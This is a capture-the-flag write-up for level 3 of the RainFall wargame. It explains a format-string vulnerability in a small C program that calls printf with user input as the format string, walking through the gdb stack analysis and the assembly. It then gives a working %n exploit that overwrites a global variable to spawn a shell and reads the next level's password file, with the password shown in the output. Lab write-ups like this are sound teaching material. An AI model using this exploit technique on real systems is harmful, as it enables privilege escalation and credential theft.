# Level 3

<h3>source.c</h3>

```console
int m = 0;

void v(void) {
  char str[520];

  fgets(str, 512, stdin);
  printf(str);
  if (m == 64) {
    fwrite("Wait what?!\n", 1, 12, stdout);
    system("/bin/sh");
  }
}


void main(void) {
  v();
}
```

<h3>Analysis</h3>

It seems that our target is the global variable `m` which is initialize to `0`, we need to somehow change this variable into `64` so it will spawn a shell for us

This time round, the programmer actually getting smarter by using `fgets()` which is more secured version of `gets()` as it limits the number of bytes written

But this programmer is stupid enough to use `printf()` with only an arg, and that is the 1st arg for `printf()` which control the formating

We could use `Format String` exploit to attack this program

<h3>Exploit</h3>

The `printf()` function will normally looks like this `printf("hello %s\n", str)`

The 1st arg is the `Format string`, where we could give any string we want, and it will iterate throught each char and print it out 1 by 1

When it encouters a special char like `%` (modifier), and since this is the 1st modifier, `printf()` will take the arg[1] provided to it and format the content before printing it out

In our case about, `%s` will format the content as a string, we could also use `%x` (hex) to print out the address instead

Now imagine what will happens with this code `printf("aaaa %x\n")`

As usual, it will read and print out each char until the `%x`, now it will try to look at the content of arg[1] and print its address out

But we never supply any arg to arg[1], so where will the it gets the content from? lets try it out in gdb!

```console
(gdb) r <<< "aaaabbbb %x %x %x %x %x %x"
Starting program: /home/user/level3/level3 <<< "aaaabbbb %x %x %x %x %x %x"
aaaabbbb 200 b7fd1ac0 b7ff37d0 61616161 62626262 20782520
```

The function print out the `aaaabbbb` like it should be, and after that it print out some hex valuable, where does it coming from ?

Base on our knowledge in assembly, a function arg will be placed at the top of the stack before calling the function itself

Below is the assembly analysis before the call of `printf()`

```console
0x080484a7 <+3>:    sub    esp,0x218                  Buffer 536 bytes for local variable
0x080484ad <+9>:    mov    eax,ds:0x8049860           ds (data segment) the content is stdin, copy this to eax
0x080484b2 <+14>:   mov    DWORD PTR [esp+0x8],eax    put eax (stdin) to 8bytes below the top of the stack, as the 3rd arg for the fgets function
0x080484b6 <+18>:   mov    DWORD PTR [esp+0x4],0x200  put number 512 to 4bytes below the top of the stack, as the 2nd arg for the fgets function
0x080484be <+26>:   lea    eax,[ebp-0x208]            load address of [ebp-0x208] (pointer to local variable1) into eax
0x080484c4 <+32>:   mov    DWORD PTR [esp],eax        put eax (pointer to local variable1) to the top of the stack, as the 1st arg for the fgets function
0x080484c7 <+35>:   call   0x80483a0 <fgets@plt>      call function fgets
0x080484cc <+40>:   lea    eax,[ebp-0x208]            load address of [ebp-0x208] (pointer to local variable1) into eax
0x080484d2 <+46>:   mov    DWORD PTR [esp],eax        put eax (pointer to local variable1) to the top of the stack, as the 1st arg for the printf function
0x080484d5 <+49>:   call   0x8048390 <printf@plt>     call function printf
```

Below is the state of the stack before the call of `printf()`

```console
(gdb) r <<< "aaaabbbb %x %x %x %x %x %x"
Starting program: /home/user/level3/level3 <<< "aaaabbbb %x %x %x %x %x %x"

Breakpoint 4, 0x080484d5 in v ()
(gdb) x/24wx $esp
0xbffff4d0:	0xbffff4e0	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff4e0:	0x61616161	0x62626262	0x20782520	0x25207825
0xbffff4f0:	0x78252078	0x20782520	0x000a7825	0x00000007
0xbffff500:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff548
0xbffff510:	0x00000040	0x00000b80	0x00000000	0xb7fde714
0xbffff520:	0x00000098	0x0000000b	0x00000000	0x00000000
```

Base on the asm code, we can see that the char* str address is at `[ebp-0x208]` and the top of the stack is at `[ebp-0x218]`

It is reflected on the state above, where `0xbffff4d0` is the top of the stack, whereas `0xbffff4e0` is the char* str and we can see `0x61616161	0x62626262` is `aaaabbbb`, the string that we gave to the program

Since the function arg is normally taken from the top of the stack `$esp` (0xbffff4d0), `printf()` will read the stack to get the arg it needed

We can visuallize it like this

Top of the stack:

```console
0xbffff4d0:	0xbffff4e0	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff4e0:	0x61616161	0x62626262	0x20782520	0x25207825
```

```console
C code version:     printf("aaaabbbb %x %x %x %x %x %x")
ASM code version:   printf(0xbffff4e0,0x00000200,0xb7fd1ac0,0xb7ff37d0,0x61616161,0x62626262,0x20782520)
```

Thus we can go back to our inital question on where the `%x` gets the value from 

```console
Starting program: /home/user/level3/level3 <<< "aaaabbbb %x %x %x %x %x %x"
aaaabbbb 200 b7fd1ac0 b7ff37d0 61616161 62626262 20782520
```

Now how could we use this knowledge to do our exploit?

`printf()` have a modiffer `%n` which will write the total number of bytes written so far to the address pointed by the arg provided to it

Example:

```console
int count;

printf("hello %n world\n", &count);
```

hello(white_space) = 6 char written before the modifier %n, so 6 will be written to the address given to arg[1], which in this case is the `int count`

so now the `int count` will be equal to 6

Combine with all these knowledge, we will now write the number `64` into variable `m` !

First we know from gdb that the address of m is `\x8c\x98\x04\x08`

Next we know that the char* str is located at `[ebp-0x208]` or `[esp+0x10]` which will become the arg[4] for `printf()`

We can test it again to be sure

```console
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08 %x %x %x %x'") | ./level3
� 200 b7fd1ac0 b7ff37d0 804988c
```

Indeed, the 4th modifier contain the start of our string, so we should put `%n` as our 4th modifier so it will write the char counter into it

We can use this shorthand `%4$n` so that `printf()` will look for `arg[4]` to apply the modifier on

```console
Address of m        -> \x8c\x98\x04\x08 (4 bytes)
A * 60              -> 6o bytes so we could reach a total of 64 bytes
%4$n                -> Write the char counter into the arg[4] of printf
```

```console
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n'"; cat -) | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

<h3>Helpful link for this exploit</h3>

https://www.youtube.com/watch?v=0WvrSfcdq1I&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=21